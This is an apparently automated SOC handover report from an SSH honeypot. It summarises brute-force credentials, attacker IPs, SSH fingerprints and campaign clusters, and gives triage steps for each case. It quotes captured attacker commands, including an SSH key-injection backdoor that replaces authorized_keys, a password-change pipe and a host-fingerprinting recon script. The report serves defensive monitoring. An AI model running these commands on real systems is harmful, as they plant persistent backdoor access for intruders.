# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-19 |
| **Generated At** | 2026-10-19T17:58:29Z |
| **Shift Time** | 17:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **472** |
| Confirmed Threats | **399** |
| False Positives Filtered | **73** (15.5%) |
| Unique Attacker IPs | **291** |
| Countries of Origin | **50** |
| High Severity Cases | **226** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **246** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **3654** |
| Unique Credential Pairs | **2823** |
| Unique Usernames | **1656** |
| Unique Passwords | **1605** |
| Successful Auth Pairs | **3036** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 439 |
| `ubuntu` | 185 |
| `345gs5662d34` | 113 |
| `admin` | 31 |
| `user` | 30 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 113 |
| `3245gs5662d34` | 109 |
| `123456` | 51 |
| `support` | 29 |
| `12345678` | 27 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 113 |
| `root` | `3245gs5662d34` | 50 |
| `support` | `support` | 27 |
| `root` | `123456` | 12 |
| `pi` | `abcd1234` | 8 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `10.0.0.73` | 2026-10-19T00:58:48 |
| `pi` | `starfish` | `121.167.171.219` | 2026-10-19T01:06:10 |
| `root` | `000000` | `92.118.39.50` | 2026-10-19T01:20:48 |
| `root` | `111111` | `92.118.39.50` | 2026-10-19T01:23:20 |
| `root` | `123` | `92.118.39.50` | 2026-10-19T01:25:42 |
| `root` | `123123` | `92.118.39.50` | 2026-10-19T01:28:04 |
| `root` | `123321` | `92.118.39.50` | 2026-10-19T01:30:23 |
| `tkadmin` | `tkadmin` | `103.78.1.160` | 2026-10-19T01:31:08 |
| `345gs5662d34` | `345gs5662d34` | `103.78.1.160` | 2026-10-19T01:31:12 |
| `tkadmin` | `3245gs5662d34` | `103.78.1.160` | 2026-10-19T01:31:14 |
| `root` | `1234` | `92.118.39.50` | 2026-10-19T01:32:34 |
| `root` | `ZAQ123wsx` | `135.237.122.43` | 2026-10-19T01:33:31 |
| `345gs5662d34` | `345gs5662d34` | `135.237.122.43` | 2026-10-19T01:33:32 |
| `root` | `3245gs5662d34` | `135.237.122.43` | 2026-10-19T01:33:32 |
| `root` | `12345` | `92.118.39.50` | 2026-10-19T01:34:42 |
| `admin` | `Ab123456` | `124.193.81.23` | 2026-10-19T01:35:46 |
| `root` | `1234567` | `92.118.39.50` | 2026-10-19T01:39:00 |
| `root` | `12345678` | `92.118.39.50` | 2026-10-19T01:41:22 |
| `root` | `123456789` | `92.118.39.50` | 2026-10-19T01:43:44 |
| `root` | `1234567890` | `92.118.39.50` | 2026-10-19T01:46:05 |
_… 3016 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **472** |
| Sessions with Fingerprint | **33** |
| Unique HASSH Fingerprints | **33** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 203 |
| Go SSH scanner | 64 |
| Paramiko (Python) | 6 |
| Unknown | 5 |
| OpenSSH | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 154 | 84 |
| `03a80b21afa8...` | Modern SSH client | 18 | 11 |
| `16443846184e...` | Generic scanner | 14 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 13 | 4 |
| `eff4c24daffc...` | Modern SSH client | 8 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 154 | 84 | Mirai/variant |
| `95420f9d932d...` | libssh | 20 | 12 | — |
| `03a80b21afa8...` | libssh | 18 | 11 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 14 | 3 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 13 | 4 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 7 | 4 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 6 | 6 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **21** |
| Campaign Clusters | **6** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 145 | 4 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 72 | 72 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "changeme\nwXrBl7anegjM\nwXrBl7anegjM"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `183.36.126.68`, `182.74.206.194`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.234`, `2.57.122.209`, `195.178.110.227`, `92.118.39.50`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `77.239.124.162`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **291** |
| Unique ASNs | **131** |
| High-Risk ASNs | **95** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 61 | HIGH |
| `AS4766` | Korea Telecom | 17 | HIGH |
| `AS396982` | Google LLC | 10 | HIGH |
| `AS63949` | Akamai Connected Cloud | 7 | HIGH |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS16276` | OVH SAS | 5 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 5 | HIGH |
| `AS21859` | Zenlayer Inc | 5 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (222)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c9625bccb0fe

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-10-19 01:20 |
| **Last Seen** | 2026-10-19 01:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 01:20:44` | `cowrie.session.connect` |
| `2026-10-19 01:20:45` | `cowrie.client.version` |
| `2026-10-19 01:20:45` | `cowrie.client.kex` |
| `2026-10-19 01:20:48` | `cowrie.login.success` |
| `2026-10-19 01:20:51` | `cowrie.session.params` |
| `2026-10-19 01:20:51` | `cowrie.command.input` |
| `2026-10-19 01:20:51` | `cowrie.command.input` |
| `2026-10-19 01:20:51` | `cowrie.command.input` |
| `2026-10-19 01:20:51` | `cowrie.command.input` |
| `2026-10-19 01:20:51` | `cowrie.command.input` |
| `2026-10-19 01:20:51` | `cowrie.command.success` |
| `2026-10-19 01:20:51` | `cowrie.command.input` |
| `2026-10-19 01:20:51` | `cowrie.command.input` |
| `2026-10-19 01:20:51` | `cowrie.command.input` |
| `2026-10-19 01:20:51` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b8b034793e5

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]160` |
| **First Seen** | 2026-10-19 01:31 |
| **Last Seen** | 2026-10-19 01:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 01:31:07` | `cowrie.session.connect` |
| `2026-10-19 01:31:07` | `cowrie.client.version` |
| `2026-10-19 01:31:07` | `cowrie.client.kex` |
| `2026-10-19 01:31:08` | `cowrie.login.success` |
| `2026-10-19 01:31:09` | `cowrie.session.params` |
| `2026-10-19 01:31:09` | `cowrie.command.input` |
| `2026-10-19 01:31:09` | `cowrie.command.failed` |
| `2026-10-19 01:31:10` | `cowrie.log.closed` |
| `2026-10-19 01:31:11` | `cowrie.session.params` |
| `2026-10-19 01:31:11` | `cowrie.command.input` |
| `2026-10-19 01:31:11` | `cowrie.session.file_download` |
| `2026-10-19 01:31:11` | `cowrie.log.closed` |
| `2026-10-19 01:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]160` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]160` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13d8a33e9666

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]160` |
| **First Seen** | 2026-10-19 01:31 |
| **Last Seen** | 2026-10-19 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 01:31:11` | `cowrie.session.connect` |
| `2026-10-19 01:31:11` | `cowrie.client.version` |
| `2026-10-19 01:31:11` | `cowrie.client.kex` |
| `2026-10-19 01:31:12` | `cowrie.login.success` |
| `2026-10-19 01:31:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]160` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39bea99df1f6

| Field | Detail |
|---|---|
| **Source IP** | `135.237.122[.]43` |
| **First Seen** | 2026-10-19 01:33 |
| **Last Seen** | 2026-10-19 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 01:33:31` | `cowrie.session.connect` |
| `2026-10-19 01:33:31` | `cowrie.client.version` |
| `2026-10-19 01:33:31` | `cowrie.client.kex` |
| `2026-10-19 01:33:31` | `cowrie.login.success` |
| `2026-10-19 01:33:31` | `cowrie.session.params` |
| `2026-10-19 01:33:31` | `cowrie.command.input` |
| `2026-10-19 01:33:31` | `cowrie.command.failed` |
| `2026-10-19 01:33:31` | `cowrie.log.closed` |
| `2026-10-19 01:33:32` | `cowrie.session.params` |
| `2026-10-19 01:33:32` | `cowrie.command.input` |
| `2026-10-19 01:33:32` | `cowrie.session.file_download` |
| `2026-10-19 01:33:32` | `cowrie.log.closed` |
| `2026-10-19 01:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.237.122[.]43` to AbuseIPDB if not already reported
- [ ] Block `135.237.122[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9897062fedcc

| Field | Detail |
|---|---|
| **Source IP** | `135.237.122[.]43` |
| **First Seen** | 2026-10-19 01:33 |
| **Last Seen** | 2026-10-19 01:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 01:33:32` | `cowrie.session.connect` |
| `2026-10-19 01:33:32` | `cowrie.client.version` |
| `2026-10-19 01:33:32` | `cowrie.client.kex` |
| `2026-10-19 01:33:32` | `cowrie.login.success` |
| `2026-10-19 01:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.237.122[.]43` to AbuseIPDB if not already reported
- [ ] Block `135.237.122[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f09b458e558

| Field | Detail |
|---|---|
| **Source IP** | `124.193.81[.]23` |
| **First Seen** | 2026-10-19 01:35 |
| **Last Seen** | 2026-10-19 01:40 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 01:35:44` | `cowrie.session.connect` |
| `2026-10-19 01:35:44` | `cowrie.client.version` |
| `2026-10-19 01:35:45` | `cowrie.client.kex` |
| `2026-10-19 01:35:46` | `cowrie.login.success` |
| `2026-10-19 01:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.193.81[.]23` to AbuseIPDB if not already reported
- [ ] Block `124.193.81[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2245a9482b88

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-10-19 01:51 |
| **Last Seen** | 2026-10-19 01:51 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 01:51:19` | `cowrie.session.connect` |
| `2026-10-19 01:51:20` | `cowrie.login.success` |
| `2026-10-19 01:51:21` | `cowrie.session.params` |
| `2026-10-19 01:51:21` | `cowrie.command.input` |
| `2026-10-19 01:51:21` | `cowrie.command.failed` |
| `2026-10-19 01:51:21` | `cowrie.command.input` |
| `2026-10-19 01:51:21` | `cowrie.command.failed` |
| `2026-10-19 01:51:21` | `cowrie.command.input` |
| `2026-10-19 01:51:21` | `cowrie.command.failed` |
| `2026-10-19 01:51:22` | `cowrie.command.input` |
| `2026-10-19 01:51:22` | `cowrie.command.failed` |
| `2026-10-19 01:51:22` | `cowrie.command.input` |
| `2026-10-19 01:51:22` | `cowrie.command.input` |
| `2026-10-19 01:51:22` | `cowrie.command.failed` |
| `2026-10-19 01:51:22` | `cowrie.command.failed` |
| … | _2 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c0b11a71c88

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-19 01:51 |
| **Last Seen** | 2026-10-19 01:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 01:51:51` | `cowrie.session.connect` |
| `2026-10-19 01:51:51` | `cowrie.client.version` |
| `2026-10-19 01:51:51` | `cowrie.client.kex` |
| `2026-10-19 01:51:52` | `cowrie.login.success` |
| `2026-10-19 01:51:52` | `cowrie.direct-tcpip.request` |
| `2026-10-19 01:51:52` | `cowrie.direct-tcpip.data` |
| `2026-10-19 01:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a261f7205d

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-10-19 01:53 |
| **Last Seen** | 2026-10-19 01:54 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 01:53:35` | `cowrie.session.connect` |
| `2026-10-19 01:53:35` | `cowrie.login.success` |
| `2026-10-19 01:53:36` | `cowrie.login.success` |
| `2026-10-19 01:53:37` | `cowrie.session.params` |
| `2026-10-19 01:53:37` | `cowrie.command.input` |
| `2026-10-19 01:53:37` | `cowrie.command.failed` |
| `2026-10-19 01:53:38` | `cowrie.command.input` |
| `2026-10-19 01:53:38` | `cowrie.command.failed` |
| `2026-10-19 01:53:38` | `cowrie.command.input` |
| `2026-10-19 01:53:38` | `cowrie.command.input` |
| `2026-10-19 01:53:38` | `cowrie.command.failed` |
| `2026-10-19 01:53:38` | `cowrie.command.failed` |
| `2026-10-19 01:54:08` | `cowrie.log.closed` |
| `2026-10-19 01:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db848864a9c1

| Field | Detail |
|---|---|
| **Source IP** | `34.156.198[.]127` |
| **First Seen** | 2026-10-19 02:20 |
| **Last Seen** | 2026-10-19 02:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:20:05` | `cowrie.session.connect` |
| `2026-10-19 02:20:05` | `cowrie.login.success` |
| `2026-10-19 02:20:06` | `cowrie.session.params` |
| `2026-10-19 02:20:06` | `cowrie.command.input` |
| `2026-10-19 02:20:06` | `cowrie.command.input` |
| `2026-10-19 02:20:06` | `cowrie.command.failed` |
| `2026-10-19 02:20:06` | `cowrie.command.input` |
| `2026-10-19 02:20:06` | `cowrie.log.closed` |
| `2026-10-19 02:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.198[.]127` to AbuseIPDB if not already reported
- [ ] Block `34.156.198[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-314a83174627

| Field | Detail |
|---|---|
| **Source IP** | `34.156.198[.]127` |
| **First Seen** | 2026-10-19 02:20 |
| **Last Seen** | 2026-10-19 02:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:20:14` | `cowrie.session.connect` |
| `2026-10-19 02:20:14` | `cowrie.login.success` |
| `2026-10-19 02:20:14` | `cowrie.session.params` |
| `2026-10-19 02:20:14` | `cowrie.command.input` |
| `2026-10-19 02:20:14` | `cowrie.command.failed` |
| `2026-10-19 02:20:20` | `cowrie.log.closed` |
| `2026-10-19 02:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.198[.]127` to AbuseIPDB if not already reported
- [ ] Block `34.156.198[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8855e3da14ed

| Field | Detail |
|---|---|
| **Source IP** | `34.156.198[.]127` |
| **First Seen** | 2026-10-19 02:20 |
| **Last Seen** | 2026-10-19 02:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:20:16` | `cowrie.session.connect` |
| `2026-10-19 02:20:16` | `cowrie.login.success` |
| `2026-10-19 02:20:16` | `cowrie.session.params` |
| `2026-10-19 02:20:16` | `cowrie.command.input` |
| `2026-10-19 02:20:20` | `cowrie.log.closed` |
| `2026-10-19 02:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.198[.]127` to AbuseIPDB if not already reported
- [ ] Block `34.156.198[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79b19e22f105

| Field | Detail |
|---|---|
| **Source IP** | `207.175.25[.]218` |
| **First Seen** | 2026-10-19 02:34 |
| **Last Seen** | 2026-10-19 02:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:34:17` | `cowrie.session.connect` |
| `2026-10-19 02:34:17` | `cowrie.login.success` |
| `2026-10-19 02:34:17` | `cowrie.session.params` |
| `2026-10-19 02:34:17` | `cowrie.command.input` |
| `2026-10-19 02:34:17` | `cowrie.command.input` |
| `2026-10-19 02:34:17` | `cowrie.command.failed` |
| `2026-10-19 02:34:17` | `cowrie.command.input` |
| `2026-10-19 02:34:18` | `cowrie.log.closed` |
| `2026-10-19 02:34:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.25[.]218` to AbuseIPDB if not already reported
- [ ] Block `207.175.25[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3bd0dfea752

| Field | Detail |
|---|---|
| **Source IP** | `207.175.25[.]218` |
| **First Seen** | 2026-10-19 02:34 |
| **Last Seen** | 2026-10-19 02:34 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-19 02:34:30` | `cowrie.session.connect` |
| `2026-10-19 02:34:30` | `cowrie.login.success` |
| `2026-10-19 02:34:31` | `cowrie.session.params` |
| `2026-10-19 02:34:31` | `cowrie.command.input` |
| `2026-10-19 02:34:31` | `cowrie.command.failed` |
| `2026-10-19 02:34:48` | `cowrie.log.closed` |
| `2026-10-19 02:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.25[.]218` to AbuseIPDB if not already reported
- [ ] Block `207.175.25[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d201fcd3e5aa

| Field | Detail |
|---|---|
| **Source IP** | `207.175.25[.]218` |
| **First Seen** | 2026-10-19 02:34 |
| **Last Seen** | 2026-10-19 02:34 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
